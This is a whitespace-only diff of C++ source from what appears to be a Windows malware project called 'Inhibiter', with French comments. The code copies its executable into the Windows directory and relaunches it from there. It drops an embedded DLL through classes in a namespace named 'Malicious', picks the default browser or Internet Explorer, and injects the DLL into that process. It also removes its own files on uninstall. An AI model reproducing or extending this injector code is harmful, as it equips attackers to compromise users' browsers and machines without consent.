@@ -16,91 +16,91 @@ using namespace System;
 
 namespace Inhibiter
 {
-    InhibiterCore::InhibiterCore(const std::string& executable) : 
+	InhibiterCore::InhibiterCore(const std::string& executable) :
 		current_executable_path(executable),
 		install_directory(System::getWindowsPath())
-    {
-        executable_path = install_directory + "\\" + Common::INHIBITER_EXE_NAME;
-        dll_path = install_directory + "\\" + Common::INHIBITION_DLL_NAME;
-    }
+	{
+		executable_path = install_directory + "\\" + Common::INHIBITER_EXE_NAME;
+		dll_path = install_directory + "\\" + Common::INHIBITION_DLL_NAME;
+	}
 
-    void InhibiterCore::install()
-    {
-        TRACE_FUNCTION
-        // par défaut, si il existe déja un exécutale de l'injecteur, celui-ci est directement remplacé.
-        if(CopyFile(current_executable_path.c_str(), executable_path.c_str(), FALSE) == FALSE)
-        {
+	void InhibiterCore::install()
+	{
+		TRACE_FUNCTION
+		// par défaut, si il existe déja un exécutale de l'injecteur, celui-ci est directement remplacé.
+		if(CopyFile(current_executable_path.c_str(), executable_path.c_str(), FALSE) == FALSE)
+		{
 			throw Common::Exception("Unable to install injector, CopyFile failed : " + Common::toString(GetLastError()));
-        }
+		}
 
 		System::Process::Launcher finish_install(executable_path, "\"" + current_executable_path + "\"");
-        if(!finish_install.isRunning())
-        {
+		if(!finish_install.isRunning())
+		{
 			throw Common::Exception("Unable to launch injector");
-        }
-    }
+		}
+	}
 
-    void InhibiterCore::uninstall()
-    {
-        TRACE_FUNCTION
-        // efface la DLL d'inhibition
-        if(!DeleteFile(dll_path.c_str()))
-        {
+	void InhibiterCore::uninstall()
+	{
+		TRACE_FUNCTION
+		// efface la DLL d'inhibition
+		if(!DeleteFile(dll_path.c_str()))
+		{
 			throw Common::Exception("Unable to delete dll, DeleteFile failed : " + Common::toString(GetLastError()));
-        }
+		}
 
-        // cet executable doit s'auto-effacer pour terminer la désinstallation
-    }
+		// cet executable doit s'auto-effacer pour terminer la désinstallation
+	}
 
-    void InhibiterCore::finishUninstall()
-    {
-        TRACE_FUNCTION
-        LOG << "Temporary exe, deleting injector";
-        if(!DeleteFile(executable_path.c_str()))
-        {
-            throw Common::Exception("Unable to delete injector, DeleteFile failed : " + Common::toString(GetLastError()));
-        }
-    }
+	void InhibiterCore::finishUninstall()
+	{
+		TRACE_FUNCTION
+		LOG << "Temporary exe, deleting injector";
+		if(!DeleteFile(executable_path.c_str()))
+		{
+			throw Common::Exception("Unable to delete injector, DeleteFile failed : " + Common::toString(GetLastError()));
+		}
+	}
 
-    bool InhibiterCore::installed()
-    {
-        return (current_executable_path == executable_path);
-    }
+	bool InhibiterCore::installed()
+	{
+		return (current_executable_path == executable_path);
+	}
 
-    bool InhibiterCore::isEverInstalled()
-    {
-        // verification de l'existence de l'injecteur et de sa dll
+	bool InhibiterCore::isEverInstalled()
+	{
+		// verification de l'existence de l'injecteur et de sa dll
 		DWORD exeFileAttr = GetFileAttributes(executable_path.c_str());
 		DWORD dllFileAttr = GetFileAttributes(dll_path.c_str());
 		if (0xFFFFFFFF == exeFileAttr ||0xFFFFFFFF == dllFileAttr )
 		{
 			return false;
 		}
-        return true;
-    }
+		return true;
+	}
 
-    void InhibiterCore::inject()
-    {
-        TRACE_FUNCTION
-        Sleep(1000);
-        Malicious::BinaryRessource substrate(SlaveDll, sizeof(SlaveDll), dll_path);
-        if(Common::INJECT_DEFAULT_BROWSER)
-        {
-            DWORD size = MAX_PATH;
-            TCHAR buff[MAX_PATH];
-            if(AssocQueryString(0, ASSOCSTR_EXECUTABLE, ".html", NULL ,buff , &size) != S_OK)
-            {
-                processToInject = Common::DEFAULT_INJECTED_PROCESS_NAME;
-            }
-            else
-            {
-                processToInject = buff;
-            }
-        }
-        else
-        {
-            processToInject = Common::DEFAULT_INJECTED_PROCESS_NAME;
-        }
+	void InhibiterCore::inject()
+	{
+		TRACE_FUNCTION
+		Sleep(1000);
+		Malicious::BinaryRessource substrate(SlaveDll, sizeof(SlaveDll), dll_path);
+		if(Common::INJECT_DEFAULT_BROWSER)
+		{
+			DWORD size = MAX_PATH;
+			TCHAR buff[MAX_PATH];
+			if(AssocQueryString(0, ASSOCSTR_EXECUTABLE, ".html", NULL ,buff , &size) != S_OK)
+			{
+				processToInject = Common::DEFAULT_INJECTED_PROCESS_NAME;
+			}
+			else
+			{
+				processToInject = buff;
+			}
+		}
+		else
+		{
+			processToInject = Common::DEFAULT_INJECTED_PROCESS_NAME;
+		}
 
 		Malicious::InternetExplorer ie;
 		LOG << "Injecting IE with PID : " + Common::toString(ie.getPid());
@@ -145,6 +145,6 @@ namespace Inhibiter
 			ie.kill();
 			throw;
 		}
-    }
+	}
 
 } // Inhibiter
